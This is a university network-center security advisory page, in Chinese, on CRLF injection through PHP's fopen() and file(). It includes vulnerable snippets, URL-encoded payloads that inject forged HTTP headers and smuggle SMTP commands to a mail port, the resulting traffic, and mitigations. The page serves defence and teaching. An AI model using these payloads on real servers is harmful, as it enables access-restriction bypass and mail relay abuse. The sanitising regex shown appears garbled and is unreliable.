<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<HTML><HEAD><TITLE>CRLF Injecti&amp;#111;n 攻击-上海交通大学网络信息中心</TITLE>


<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
<META content="" name="keywords">
<META content="" name="description"><LINK href="../../images/layout.css" type="text/css" rel="stylesheet"><LINK href="../../images/chromestyle.css" type="text/css" rel="stylesheet">

<!--Announced by Visual SiteBuilder 9-->
<link rel="stylesheet" type="text/css" href="../../_sitegray/_sitegray_d.css" />
<script language="javascript" src="../../_sitegray/_sitegray.js"></script>
<!-- CustomerNO:776562626572323074684754525b564203040000 -->
<link rel="stylesheet" type="text/css" href="../../wlaq/content.vsb.css" />
<META Name="keywords" Content="上海交通大学网络信息中心" />
<script type="text/javascript" src="../../system/resource/js/counter.js"></script>
<script type="text/javascript">_jsq_(1024,'/wlaq/content.jsp',1275,739302322)</script>
</HEAD>
<BODY><script type="text/javascript" src="../../images/chrome.js"></script>
<DIV id="container"><!-- header -->
<DIV id="top">
<DIV class="logo">
<DIV class="mlink">&nbsp;</DIV>
<DIV class="searchbox"><!--#begineditable viewid="1828" name="站内搜索"-->





<form action="../../search.jsp?wbtreeid=1024" method="post" name="a1828a" onsubmit="return subsearchdataa1828a()" style="display: inline">
  <input type="hidden" name="Find" value="find"><input type="hidden" name="entrymode" value="1"><input type="hidden" id="INTEXT2" name="INTEXT2" value=""><input type="hidden" name="news_search_code">
站内搜索&nbsp;<iframe id="intextframea1828a" src="" scrolling="no" frameborder="0" style="position:absolute;top:0px;left:0px;display:none"></iframe>
       <input class="s1" name="INTEXT">
       <input type="image" src="../../images/searchbox.png" class="s2">
</form>
<script>
function subsearchdataa1828a()
{ 
    if(checkDataa1828a(document.a1828a))
    {
       return true;  
    }
    return false;
}       
</script>

    <script> 
    function checkDataa1828a(formname)
    {
        if(window.toFF==1)
            {
                var ssvalue = a1828a.INTEXT.value;
                document.a1828a.INTEXT2.value = base64.encode(Simplized(ssvalue));
            }else
            document.a1828a.INTEXT2.value = base64.encode(document.a1828a.INTEXT.value);
           return true;
    }
    </script>
<script language="javascript" src="../../system/resource/js/base64.js"></script> 
<!--#endeditable--></DIV></DIV>
<DIV class="bn">
<DIV class="banner">
<DIV class="mlink"><!--#begineditable viewid="1826" name="首页左上链接"--><script language="javascript" src="../../system/resource/js/dynclicks.js"></script><script language="javascript" src="../../system/resource/js/openlink.js"></script>    <a href="../../web_en/index_en.htm" target="_blank" title="" onclick="_addDynClicks(&#34;wburl&#34;, 739302322, 1808)">[English Version]</a>
<!--#endeditable--></DIV>


</DIV>
<DIV class="navi chromestyle" id="chromemenu"><!--#begineditable viewid="1785" name="网站主导航"--><a href="../../index.jsp" class="navi1" onmouseover="this.className='navi1-1'" onmouseout="this.className='navi1'" onclick="blur()"></a>
<a href="../../zxgk.htm" rel="dropmenu2" class="navi2" onmouseover="this.className='navi2-1'" onmouseout="this.className='navi2'" onclick="blur()"></a>
<a href="../../gzzd.htm" rel="dropmenu3" class="navi3" onmouseover="this.className='navi3-1'" onmouseout="this.className='navi3'" onclick="blur()"></a>
<a href="../../wlfw.htm" rel="dropmenu4" class="navi4" onmouseover="this.className='navi4-1'" onmouseout="this.className='navi4'" onclick="blur()"></a>
<a href="../../wlaq.htm" rel="dropmenu5" class="navi5" onmouseover="this.className='navi5-1'" onmouseout="this.className='navi5'" onclick="blur()"></a>
<a href="../../yhzc.htm" rel="dropmenu6" class="navi6" onmouseover="this.className='navi6-1'" onmouseout="this.className='navi6'" onclick="blur()"></a>
<a href="../../lxwm.htm" class="navi7" onmouseover="this.className='navi7-1'" onmouseout="this.className='navi7'" onclick="blur()"></a>
<a href="../../web_en.htm" rel="dropmenu8" class="navi8" onmouseover="this.className='navi8-1'" onmouseout="this.className='navi8'" onclick="blur()"></a>
<!--#endeditable--></DIV><!-- 1st drop down menu -->
<DIV class="dropmenudiv" id="dropmenu1"></DIV>
<DIV class="dropmenudiv" id="dropmenu2"><!--#begineditable name="中心概况子栏目" viewid="1837"-->    <a href="../../zxgk/zxjj.htm" title="中心简介">中心简介</a>
    <a href="../../zxgk/xxwjj.htm" title="校园网简介">校园网简介</a>
    <a href="../../zxgk/xyxxh.htm" title="校园信息化">校园信息化</a>
<!--#endeditable--></DIV>
<DIV class="dropmenudiv" id="dropmenu3"><!--#begineditable name="规章制度子栏目" viewid="1838"-->    <a href="../../gzzd/gzzdlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1018" title="规章条例">规章条例</a>
    <a href="../../gzzd/gzzdlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1019" title="政策法规">政策法规</a>
<!--#endeditable--></DIV>
<DIV class="dropmenudiv" id="dropmenu4"><!--#begineditable name="网络服务子栏目" viewid="1839"-->    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1022" title="统一身份认证">统一身份认证</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1021" title="电子邮件">电子邮件</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1044" title="无线网">无线网</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1040" title="VPN">VPN</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1039" title="校园一卡通">校园一卡通</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1042" title="学生宿舍网络">学生宿舍网络</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1041" title="个人网络存储">个人网络存储</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1038" title="虚拟主机">虚拟主机</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1043" title="校园网">校园网</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1045" title="校内代理">校内代理</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1046" title="网络短信平台">网络短信平台</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1047" title="微软校园软件正版化">微软校园软件正版化</a>
    <a href="../../wlfw/wlfwlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1049" title="网络会议和视频转播">网络会议和视频转播</a>
<!--#endeditable--></DIV>
<DIV class="dropmenudiv" id="dropmenu5"><!--#begineditable name="网络安全子栏目" viewid="1840"--><a href="../../wlaq/wlaqlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1024" title="安全建议">安全建议</a>
<a href="../../wlaq/wlaqlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1026" title="安全事件通告">安全事件通告</a>
<a href="http://windowsupdate.sjtu.edu.cn" target="_blank" title="自动更新服务">自动更新服务</a>
<a href="http://antivirus.sjtu.edu.cn" target="_blank" title="防病毒服务">防病毒服务</a>
<!--#endeditable--></DIV>
<DIV class="dropmenudiv" id="dropmenu6"><!--#begineditable name="用户支持子栏目" viewid="1841"-->    <a href="../../yhzc/yhzclist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1098" title="校园网运行状态">校园网运行状态</a>
    <a href="../../yhzc/yhzclist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1029" title="常用设置">常用设置</a>
    <a href="../../yhzc/yhzclist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1030" title="用户指南">用户指南</a>
    <a href="../../yhzc/yhzclist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1031" title="文档下载">文档下载</a>
<!--#endeditable--></DIV>
<DIV class="dropmenudiv" id="dropmenu7"></DIV>
<DIV class="dropmenudiv" id="dropmenu8"></DIV>

</DIV>
<DIV style="clear: both"></DIV></DIV><script type="text/javascript">

cssdropdown.startchrome("chromemenu")

</script><!-- header end --><!-- main -->
<DIV id="main"><!-- main left -->
<DIV class="ln">
<DIV class="mailloginform">
<DIV class="mtitle64"></DIV>
<DIV class="mtxt">
<UL class="hl"><!--#begineditable viewid="1861" name="网络安全左边导航"-->    <li><div class="pt4"><a href="../../wlaq/wlaqlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1024" title="安全建议">安全建议</a></div></li>
    <li><div class="pt4"><a href="../../wlaq/wlaqlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1026" title="安全事件通告">安全事件通告</a></div></li>
    <li><div class="pt4"><a href="http://windowsupdate.sjtu.edu.cn" target="_blank" title="自动更新服务">自动更新服务</a></div></li>
    <li><div class="pt4"><a href="http://antivirus.sjtu.edu.cn" target="_blank" title="防病毒服务">防病毒服务</a></div></li>
<!--#endeditable--></UL></DIV>
<DIV style="clear: both"></DIV>
<DIV class="n1"></DIV>
<DIV class="n2"></DIV>
<DIV class="lititle"></DIV>
<DIV class="hotlink">
<UL class="hl">
<LI>
<DIV class="pt4"><A href="http://cert1.sjtu.edu.cn" target="_blank">安全问题举报</A></DIV></LI>
<LI>
<DIV class="pt4"><A href="http://bbs.sjtu.edu.cn/bbsdoc?board=SJTUnet" target="_blank">讨论交流</A></DIV></LI></UL></DIV></DIV></DIV><!-- main left end --><!-- main right -->
<DIV class="rn"><!-- main right top -->
<DIV class="htmc"></DIV><!-- location -->
<DIV class="htlocation">
<DIV id="position"><!--#begineditable viewid="1784" name="当前位置"-->  
<a href="../../index.jsp">首页</a><a href="../../wlaq.htm">网络安全</a><a href="../../wlaq/wlaqlist.jsp?urltype=tree.TreeTempUrl&wbtreeid=1024">安全建议</a>正文<!--#endeditable--></DIV></DIV><!-- location end --><!-- main right top end --><!-- main right body -->
<DIV class="hm">
<DIV style="clear: both"></DIV>
<DIV class="maintxt"><!--#begineditable viewid="1858" name="文章内容"--><script language="javascript" src="../../_dwr/interface/NewsvoteDWR.js"></script><script language="javascript" src="../../_dwr/engine.js"></script><script language="javascript" src="../../system/resource/js/news/newscontent.js"></script><script language="javascript" src="../../system/resource/js/ajax.js"></script><style type="text/css">
     .tpcontent{FONT-WEIGHT: bold; FONT-SIZE: 11pt; COLOR: #2b2b2b; FONT-FAMILY: 宋体;}
     .cytpstyle{FONT-SIZE: 9pt; COLOR: #2b2b2b; FONT-FAMILY: 宋体;}
     .content{margin:auto;text-align:left;line-height:18px;padding:3px 0 0 0;color:#727272;}
     .process{width:162px;height:11px;background:#EDEDED;overflow:hidden;float:left;margin-left:26px !important;margin-left:13px;margin-right:10px;}
     .process div{width:160px;height:11px;background:url(../../system/resource/images/newsvote/bg.gif) repeat-x;border-left:1px solid #000;border-right:1px solid #000;}
     .process .style7{border-left-color:#ff0000;border-right-color:#ff0000;background-position:0 -77px;}
</style>
<form name="_newscontent_fromname">
<div>
    <p id="text-strong">CRLF Injecti&amp;#111;n 攻击</p>
    <div align="center">2010-11-06&nbsp;firstonline&nbsp;点击：[<script>_showDynClicks("wbnews", 739302322, 1275)</script>] </div>
    <hr>
    <div><table width="95%" border="0" cellpadding="1" cellspacing="1" bgcolor="#3366cc">

      <tr>
        <td align="top" background="http://comic.sjtu.edu.cn/bbs/" bgcolor="#EFEFEF" class="text">
         <table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
           <td width="96%" class="smText" align="center">本文由 <a href="mailto:firstonline@sjtu.edu.cn">firstonline</a> 于2007 4月 10 at 3:21pm
		    发表，已被阅读 20202 次</td>
          </tr>
         </table>

PHP 的 fopen(), file() 及其它函数存在一个缺陷，即用户随意地添加额外HTTP报头信息到HTTP请求数据包中。攻击者可以利用此缺陷绕过服务器的安全限制，进行非法访问。在某些情况下，这个缺陷甚至可以打开任意的网络连接，在代理端执行PHP脚本和打开邮件转发。 <BR><BR>PHP有一些函数用文件名（如：fopen(), file()等）作为它们的参数。如果在php.ini中allow_url_fopen被设置为打开的，这些函数也允许以接受URL来替代接收文件，并且用正确的协议连接到服务器。那么这些函数将很容易遭到 CRLF Injection 攻击。 <BR><BR><BR>1)我们开始一个简单的攻击。下面这段PHP代码被保存并取名为snippet.php： <BR><BR>
<TABLE cellspacing="0" cellpadding="0" width="100%">
<T>
<TR>
<TD>
<TABLE class="ubb_code" cellspacing="0" cellpadding="6" width="95%" align="right">
<T>
<TR>
<TD><strong>以下内容为程序代码:</strong><BR><BR><BR>&lt;?php <BR><BR>echo '&lt;pre&gt;'; <BR><BR>print_r(file("http://www.site1.st/api?sunnan=＄sunnan&amp;vind=＄vind"<img src="http://comic.sjtu.edu.cn/images/wink.gif" border="0">); <BR><BR>echo '&lt;/pre&gt;'; <BR><BR>?&gt; <BR><BR></TD></TR></T></TABLE></TD></TR></T></TABLE><BR>如果攻击者这样发送： <BR>
<TABLE cellspacing="0" cellpadding="0" width="100%">
<T>
<TR>
<TD>
<TABLE class="ubb_code" cellspacing="0" cellpadding="6" width="95%" align="right">
<T>
<TR>
<TD><strong>以下内容为程序代码:</strong><BR><BR><BR>snippet.php?sunnan=visby&amp;vind=gotland%20HTTP <BR>/1.0%0D%0AHost%3A%20www.site2.st%0D%0AUser-A <BR>gent%3A%20Ulf/0.0%0D%0AReferer%3A%20http%3A <BR>%2F%2Fwww.gnuheter.org%2F%0D%0ACookie%3A%20u <BR>ser%3Dulf%0D%0A%0D%0A <BR><BR><BR></TD></TR></T></TABLE></TD></TR></T></TABLE><BR>(必须在一行上) <BR><BR>这个 HTTP 请求将被发送给 www.site1.st: <BR>
<TABLE cellspacing="0" cellpadding="0" width="100%">
<T>
<TR>
<TD>
<TABLE class="ubb_code" cellspacing="0" cellpadding="6" width="95%" align="right">
<T>
<TR>
<TD><strong>以下内容为程序代码:</strong><BR><BR><BR>GET /api?sunnan=visby&amp;vind=gotland HTTP/1.0 <BR>Host: www.site2.st <BR>User-Agent: Ulf/0.0 <BR>Referer: http://www.gnuheter.org/ <BR>Cookie: user=ulf <BR><BR>HTTP/1.0 <BR>Host: www.site1.st <BR>User-Agent: PHP/4.1.2 <BR><BR><BR></TD></TR></T></TABLE></TD></TR></T></TABLE><BR>你可以看到，真实的PHP头信息被正确发送，但被服务器忽略了，因为在它们指向的报头结束之前我们发送两个CRLF。 <BR><BR>利用此缺陷，攻击者能够任意添加用户代理（user agent），referers 和 cookies。如果站点1和站点2是同一台服务器上的虚拟主机，即使snippet.php有限制，攻击者也能绕过其限制非法访问站点2。 <BR><BR>2) 如果PHP脚本是精心构建的，像下面这个叫 dotcom.php 的脚本: <BR>
<TABLE cellspacing="0" cellpadding="0" width="100%">
<T>
<TR>
<TD>
<TABLE class="ubb_code" cellspacing="0" cellpadding="6" width="95%" align="right">
<T>
<TR>
<TD><strong>以下内容为程序代码:</strong><BR><BR><BR>&lt;?php <BR><BR>＄fp = fopen(＄url, 'r'); <BR>fpassthru(＄fp); <BR><BR>?&gt; <BR><BR></TD></TR></T></TABLE></TD></TR></T></TABLE><BR><BR>将能连接到任意的端口，并发送任意指令，在代理端执行PHP脚本和打开邮件转发。 <BR><BR>如果攻击者这样发送： <BR><BR>
<TABLE cellspacing="0" cellpadding="0" width="100%">
<T>
<TR>
<TD>
<TABLE class="ubb_code" cellspacing="0" cellpadding="6" width="95%" align="right">
<T>
<TR>
<TD><strong>以下内容为程序代码:</strong><BR><BR><BR>dotcom.php?url=http%3A%2F%2Fmail.site1 <BR>.st%3A25%2F+HTTP/1.0%0D%0AHELO+my.own. <BR>machine%0D%0AMAIL+FROM%3A%3Cme%40my.ow <BR>n.machine%3E%0D%0ARCPT+TO%3A%3Cinfo%40s <BR>ite1.st%3E%0D%0ADATA%0D%0Ai+will+never+ <BR>say+the+word+PROCRASTINATE+again%0D%0A. <BR>%0D%0AQUIT%0D%0A%0D%0A <BR><BR></TD></TR></T></TABLE></TD></TR></T></TABLE><BR><BR>(必须在一行上) <BR><BR>PHP 解释器将连接到 mail.site1.st:25，并且发送下面的指令： <BR><BR>
<TABLE cellspacing="0" cellpadding="0" width="100%">
<T>
<TR>
<TD>
<TABLE class="ubb_code" cellspacing="0" cellpadding="6" width="95%" align="right">
<T>
<TR>
<TD><strong>以下内容为程序代码:</strong><BR><BR><BR>GET / HTTP/1.0 <BR>HELO my.own.machine <BR>MAIL FROM:&lt;me@my.own.machine&gt; <BR>RCPT TO:&lt;info@site1.st&gt; <BR>DATA <BR>i will never say the word PROCRASTINATE again <BR>. <BR>QUIT <BR><BR>HTTP/1.0 <BR>Host: mail.site1.st:25 <BR>User-Agent: PHP/4.1.2 <BR><BR>Both PHP and the MTA will complain, but the mail is still sent. <BR><BR><BR></TD></TR></T></TABLE></TD></TR></T></TABLE>  <BR>  <BR>临时解决方案 ： <BR><BR>* 通过在PHP脚本中嵌入如下指令，确保所有这种类型的URL变量在使用时已被清空： <BR><BR><BR>
<TABLE cellspacing="0" cellpadding="0" width="100%">
<T>
<TR>
<TD>
<TABLE class="ubb_code" cellspacing="0" cellpadding="6" width="95%" align="right">
<T>
<TR>
<TD><strong>以下内容为程序代码:</strong><BR><BR>＄var = preg_replace('/\\s+/', ', ＄var); <BR></TD></TR></T></TABLE></TD></TR></T></TABLE><BR><BR>* 如果你的脚本不需要访问URLs，建议在php.ini中关闭allow_url_fopen 。 

        </td>
       </tr>
</table></div><div id="div_vote_id"></div>
    <p align="right">
        上一条：<a href="1276.htm">关于防御U盘病毒的安全建议</a>
        下一条：<a href="1274.htm">跨站&amp;#083;cript攻击和防范</a>
    </p>
    <p align="right">【<a href="javascript:window.opener=null;window.open('','_self');window.close();">关闭</a>】</p>
</div>
</from>
<script>
    showVote(1275,739302322,"#F3F7FA"," class='cytpstyle' ","#090909","<img src ='/system/resource/images/newsvote/ss00.png' border='0'>"," class='tpcontent' ","欢迎参与投票",10,"<img src='/system/resource/images/newsvote/submit2.gif' onclick='_newscontent_getresult(1275,739302322)'  style='cursor:hand;'>","<img src='/system/resource/images/newsvote/view2.gif' onclick='_newscontent_lookresult()' style='cursor:hand;'>",document._newscontent_fromname,"请填写投票项！","127.0.0.1","您已经投过票了！","投票系统出现异常，请稍后再试！","感谢参与！","投票结果")
</script><!--#endeditable-->
<FORM name="_newscontent_fromname"></DIV>
<DIV style="clear: both"></DIV></DIV>
<DIV style="clear: both"></DIV><!-- main right body end --></DIV><!-- main right end --></DIV><!-- main end -->
<DIV class="k"></DIV><!-- footer -->
<DIV id="footer">
<DIV class="link" style="display: none">友情链接：<SELECT class="s3" name="link" onchange="javascript:window.open(this.options[this.selectedIndex].value)"> <OPTION value="" selected>&nbsp;&nbsp;</OPTION> <OPTION value="http://www.sjtu.edu.cn">上海交通大学</OPTION> <OPTION value="http://www.edu.cn">中国教育和科研网</OPTION> <OPTION value="http://www.cdream.com/">校园梦网</OPTION></SELECT> </DIV>
<DIV class="cp"><!--#begineditable viewid="1825" name="版权"--><P>2004-2013 上海交通大学网络中心 版权所有 <FONT color="#2c678d">沪交ICP备05069</FONT></P><!--#endeditable--></DIV></DIV><!-- footer end --></DIV>

</FORM></BODY></HTML>
